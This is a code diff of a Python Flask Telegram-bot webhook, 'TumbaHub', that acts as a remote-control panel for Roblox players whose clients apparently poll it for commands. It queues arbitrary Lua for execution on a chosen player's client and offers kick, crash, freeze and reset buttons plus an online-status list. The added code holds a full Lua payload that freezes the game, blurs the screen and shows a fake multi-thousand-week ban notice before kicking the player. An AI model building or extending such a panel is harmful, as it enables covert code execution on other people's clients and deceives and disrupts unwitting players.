@@ -179,7 +179,7 @@ def telegram_webhook():
                 send_telegram_message(TELEGRAM_CHAT_ID, "🎛 **Главное меню TumbaHub**\nВыберите раздел:", reply_markup=keyboard, parse_mode="Markdown")
                 return jsonify({"status": "ok"})
 
-            # НОВОЕ: Если бот ждет длительность сообщения
+            # 2. ЕСЛИ БОТ ЖДЕТ ДЛИТЕЛЬНОСТЬ СООБЩЕНИЯ
             if chat_id in awaiting_msg_duration:
                 try:
                     duration = int(text)
@@ -187,7 +187,6 @@ def telegram_webhook():
                     target_user = data["user"]
                     msg_text = data["text"]
 
-                    # Генерируем Lua-код для ScreenGui
                     lua_code = f"""
 local gui = Instance.new("ScreenGui", game.CoreGui)
 gui.DisplayOrder = 999
@@ -210,16 +209,16 @@ game:GetService("Debris"):AddItem(gui, {duration})
                     send_telegram_message(TELEGRAM_CHAT_ID, f"✅ Сообщение '{msg_text}' на {duration} сек. отправлено игроку {target_user}!")
                 except ValueError:
                     send_telegram_message(TELEGRAM_CHAT_ID, "⚠️ Ошибка: Введите число. Попробуйте снова.")
-                return jsonify({{"status": "ok"}})
+                return jsonify({"status": "ok"})
 
-            # НОВОЕ: Если бот ждет текст сообщения
+            # 3. ЕСЛИ БОТ ЖДЕТ ТЕКСТ СООБЩЕНИЯ
             if chat_id in awaiting_msg_text:
                 target_user = awaiting_msg_text.pop(chat_id)
                 awaiting_msg_duration[chat_id] = {"user": target_user, "text": text}
                 send_telegram_message(TELEGRAM_CHAT_ID, f"💬 Сообщение: '{text}'.\n\nТеперь отправь длительность сообщения в секундах (например, 10).")
                 return jsonify({"status": "ok"})
 
-            # 2. ЕСЛИ БОТ ЖДЕТ СКРИПТ (Execute)
+            # 4. ЕСЛИ БОТ ЖДЕТ СКРИПТ (Execute)
             if chat_id in awaiting_execute:
                 target_user = awaiting_execute.pop(chat_id)
                 action = f"/execute__{text}"
@@ -231,7 +230,7 @@ game:GetService("Debris"):AddItem(gui, {duration})
                 send_telegram_message(TELEGRAM_CHAT_ID, f"✅ Скрипт успешно отправлен в очередь игрока {target_user}!")
                 return jsonify({"status": "ok"})
 
-            # 3. ЕСЛИ БОТ ЖДЕТ ПРИЧИНУ КИКА
+            # 5. ЕСЛИ БОТ ЖДЕТ ПРИЧИНУ КИКА
             if chat_id in awaiting_reason:
                 target_user = awaiting_reason.pop(chat_id)
                 action = f"/kick_{text}"
@@ -243,7 +242,7 @@ game:GetService("Debris"):AddItem(gui, {duration})
                 send_telegram_message(TELEGRAM_CHAT_ID, f"✅ {target_user} кикнут с причиной:\n💬 {text}")
                 return jsonify({"status": "ok"})
 
-            # 4. РУЧНОЙ ВВОД (через пробелы)
+            # 6. РУЧНОЙ ВВОД КОМАНД (через пробелы)
             parts = text.split(' ', 2)
             if len(parts) >= 2:
                 base_cmd = parts[0]
@@ -282,11 +281,9 @@ game:GetService("Debris"):AddItem(gui, {duration})
                 if len(commands_queue) == 0:
                     requests.post(f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendMessage", json={"chat_id": TELEGRAM_CHAT_ID, "text": "⚠️ В базе пока нет игроков."})
                 else:
-                    # Генерируем кнопки-ники
                     player_buttons = []
                     current_time = time.time()
                     for player in commands_queue.keys():
-                        # Если игрок пинговал сервер меньше 45 секунд назад -> Онлайн
                         if player in last_seen and (current_time - last_seen[player] < 45):
                             status_icon = "🟢"
                         else:
@@ -315,7 +312,12 @@ game:GetService("Debris"):AddItem(gui, {duration})
                 
                 # --- ОТКРЫТИЕ ПРОФИЛЯ ---
                 if btn_action == "playerprof":
-                    # Собираем меню профиля игрока
+                    # Очищаем все ожидания для этого чата
+                    if chat_id in awaiting_execute: del awaiting_execute[chat_id]
+                    if chat_id in awaiting_reason: del awaiting_reason[chat_id]
+                    if chat_id in awaiting_msg_text: del awaiting_msg_text[chat_id]
+                    if chat_id in awaiting_msg_duration: del awaiting_msg_duration[chat_id]
+
                     keyboard = {
                         "inline_keyboard": [
                             [{"text": "💬 Message", "callback_data": f"message_{target_user}"}],
@@ -323,8 +325,7 @@ game:GetService("Debris"):AddItem(gui, {duration})
                             [{"text": "🧊 Freeze", "callback_data": f"freeze_{target_user}"}, {"text": "🏃 Unfreeze", "callback_data": f"unfreeze_{target_user}"}],
                             [{"text": "🥾 Kick", "callback_data": f"kick_{target_user}"}, {"text": "💥 Crash", "callback_data": f"crash_{target_user}"}],
                             [{"text": "💀 Reset", "callback_data": f"reset_{target_user}"}],
-                            [{"text": "✅ Check Status", "callback_data": f"checkstatus_{target_user}"}],
-                            [{"text": "🔙 Назад к списку", "callback_data": "menu_players"}]
+                            [{"text": "🔙 Назад", "callback_data": "menu_players"}]
                         ]
                     }
                     requests.post(
@@ -340,25 +341,11 @@ game:GetService("Debris"):AddItem(gui, {duration})
                 # --- ОТПРАВКА СООБЩЕНИЯ ---
                 elif btn_action == "message":
                     awaiting_msg_text[chat_id] = target_user
-                    # Очищаем другие состояния
-                    if chat_id in awaiting_execute: del awaiting_execute[chat_id]
-                    if chat_id in awaiting_reason: del awaiting_reason[chat_id]
-                    
                     send_telegram_message(TELEGRAM_CHAT_ID, f"✍️ Отправь мне текст сообщения для игрока **{target_user}**:", parse_mode="Markdown")
-
-                # --- ПРОВЕРКА СТАТУСА ---
-                elif btn_action == "checkstatus":
-                    action = "/check_status"
-                    if target_user not in commands_queue: commands_queue[target_user] = []
-                    commands_queue[target_user].append(action)
-                    answer_callback(callback_id, text=f"✅ Запрос статуса отправлен {target_user}.")
 
                 # --- ВЫПОЛНЕНИЕ СКРИПТА ---
                 elif btn_action == "execselect":
                     awaiting_execute[chat_id] = target_user
-                    if chat_id in awaiting_reason: del awaiting_reason[chat_id] # Очищаем конфликт состояний
-                    if chat_id in awaiting_msg_text: del awaiting_msg_text[chat_id]
-                    
                     requests.post(
                         f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendMessage", 
                         json={"chat_id": TELEGRAM_CHAT_ID, "text": f"✍️ Отправь мне Lua-код для выполнения на клиенте **{target_user}**:", "parse_mode": "Markdown"}
@@ -367,10 +354,6 @@ game:GetService("Debris"):AddItem(gui, {duration})
                 # --- КИК ---
                 elif btn_action == "kick":
                     awaiting_reason[chat_id] = target_user
-                    if chat_id in awaiting_execute: del awaiting_execute[chat_id]
-                    if chat_id in awaiting_msg_text: del awaiting_msg_text[chat_id]
-                    
-                    # Создаем две кнопки: Дефолт и Фейк Бан
                     keyboard = {
                         "inline_keyboard": [
                             [{"text": "Дефолт: Вы были кикнуты", "callback_data": f"defaultkick_{target_user}"}],
@@ -395,9 +378,64 @@ game:GetService("Debris"):AddItem(gui, {duration})
                     if chat_id in awaiting_reason:
                         del awaiting_reason[chat_id]
                         
-                    # Тот самый текст с картинки
-                    fake_ban_text = "You have been temporarily banned. [Remaining ban duration: 4960 weeks 2 days 5 hours 19 minutes 59 seconds ]"
-                    action = f"/kick_{fake_ban_text}"
+                    lua_code = """
+pcall(function()
+    for _, v in pairs(workspace:GetDescendants()) do
+        if v:IsA("BasePart") then v.Anchored = true end
+    end
+    local char = game.Players.LocalPlayer.Character
+    if char then
+        local hum = char:FindFirstChildOfClass("Humanoid")
+        local animCtrl = char:FindFirstChildOfClass("AnimationController")
+        if hum then
+            for _, track in pairs(hum:GetPlayingAnimationTracks()) do track:AdjustSpeed(0) end
+        end
+        if animCtrl then
+            for _, track in pairs(animCtrl:GetPlayingAnimationTracks()) do track:AdjustSpeed(0) end
+        end
+    end
+    local blur = Instance.new("BlurEffect", game.Lighting)
+    blur.Size = 24
+    local sg = Instance.new("ScreenGui", game.CoreGui)
+    sg.IgnoreGuiInset = true
+    sg.DisplayOrder = 99999
+    local bg = Instance.new("Frame", sg)
+    bg.Size = UDim2.new(1, 0, 1, 0)
+    bg.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
+    bg.BackgroundTransparency = 0.2
+    local modal = Instance.new("Frame", bg)
+    modal.Size = UDim2.new(0, 400, 0, 200)
+    modal.Position = UDim2.new(0.5, -200, 0.5, -100)
+    modal.BackgroundColor3 = Color3.fromRGB(60, 60, 60)
+    modal.BorderSizePixel = 0
+    local title = Instance.new("TextLabel", modal)
+    title.Size = UDim2.new(1, 0, 0, 40)
+    title.BackgroundTransparency = 1
+    title.Text = "Disconnected"
+    title.TextColor3 = Color3.new(1, 1, 1)
+    title.Font = Enum.Font.SourceSansBold
+    title.TextSize = 24
+    local msg = Instance.new("TextLabel", modal)
+    msg.Size = UDim2.new(1, -40, 1, -100)
+    msg.Position = UDim2.new(0, 20, 0, 40)
+    msg.BackgroundTransparency = 1
+    msg.Text = "You have been temporarily banned.\\n[Remaining ban duration: 4960 weeks 2 days 5 hours 19 minutes 59 seconds ]\\n(Error Code: 600)"
+    msg.TextColor3 = Color3.fromRGB(200, 200, 200)
+    msg.Font = Enum.Font.SourceSans
+    msg.TextSize = 18
+    msg.TextWrapped = true
+    local btn = Instance.new("TextButton", modal)
+    btn.Size = UDim2.new(0, 150, 0, 40)
+    btn.Position = UDim2.new(0.5, -75, 1, -50)
+    btn.BackgroundColor3 = Color3.fromRGB(200, 200, 200)
+    btn.Text = "Leave"
+    btn.TextColor3 = Color3.new(0, 0, 0)
+    btn.Font = Enum.Font.SourceSansBold
+    btn.TextSize = 20
+    btn.MouseButton1Click:Connect(function() game.Players.LocalPlayer:Kick("Left the game") end)
+end)
+"""
+                    action = f"/execute__{lua_code.strip()}"
                     
                     if target_user not in commands_queue: 
                         commands_queue[target_user] = []
@@ -405,7 +443,7 @@ game:GetService("Debris"):AddItem(gui, {duration})
                     
                     requests.post(
                         f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendMessage", 
-                        json={"chat_id": TELEGRAM_CHAT_ID, "text": f"✅ {target_user} отлетел с экраном Fake Ban!"}
+                        json={"chat_id": TELEGRAM_CHAT_ID, "text": f"✅ {target_user} отлетел с экраном Fake Ban (Error 600)!"}
                     )
                     
                 # --- КРАШ ---
@@ -418,13 +456,9 @@ game:GetService("Debris"):AddItem(gui, {duration})
                 # --- РЕСЕТ ---
                 elif btn_action == "reset":
                     action = "/reset"
-                    if target_user not in commands_queue: 
-                        commands_queue[target_user] = []
+                    if target_user not in commands_queue: commands_queue[target_user] = []
                     commands_queue[target_user].append(action)
-                    requests.post(
-                        f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendMessage", 
-                        json={"chat_id": TELEGRAM_CHAT_ID, "text": f"💀 Команда сброса (Reset) отправлена {target_user}"}
-                    )
+                    requests.post(f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendMessage", json={"chat_id": TELEGRAM_CHAT_ID, "text": f"💀 Команда сброса (Reset) отправлена {target_user}"})
                 
                 # --- ЗАМОРОЗКА ---
                 elif btn_action == "freeze":
@@ -440,7 +474,6 @@ game:GetService("Debris"):AddItem(gui, {duration})
                     commands_queue[target_user].append(action)
                     requests.post(f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendMessage", json={"chat_id": TELEGRAM_CHAT_ID, "text": f"🏃 Команда Unfreeze (Разморозка) отправлена {target_user}"})
                 
-            # Убираем часики загрузки с нажатой кнопки
             requests.post(f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/answerCallbackQuery", json={"callback_query_id": callback_id})
 
     return jsonify({"status": "ok"})
